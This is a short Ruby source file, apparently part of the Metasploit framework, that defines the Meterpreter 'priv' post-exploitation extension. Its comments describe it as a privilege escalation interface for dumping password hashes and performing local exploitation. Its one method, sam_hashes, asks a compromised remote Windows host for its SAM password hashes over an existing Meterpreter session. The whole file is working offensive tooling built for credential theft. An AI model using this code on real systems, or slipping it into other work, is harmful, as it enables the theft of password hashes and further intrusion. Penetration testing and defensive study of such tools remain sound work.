#!/usr/bin/ruby

require 'rex/post/meterpreter/extensions/priv/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Priv

###
#
# This meterpreter extensions a privilege escalation interface that is capable
# of doing things like dumping password hashes and performing local
# exploitation.
#
###
class Priv < Extension

	#
	# Initializes the privilege escalationextension.
	#
	def initialize(client)
		super(client, 'priv')
		
		client.register_extension_aliases(
			[
				{ 
					'name' => 'priv',
					'ext'  => self
				}
			])
	end

	#
	# Returns an array of SAM hashes from the remote machine.
	#
	def sam_hashes
		response = client.send_request(
			Packet.create_request('priv_passwd_get_sam_hashes'))

		response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/)
	end

end

end; end; end; end; end
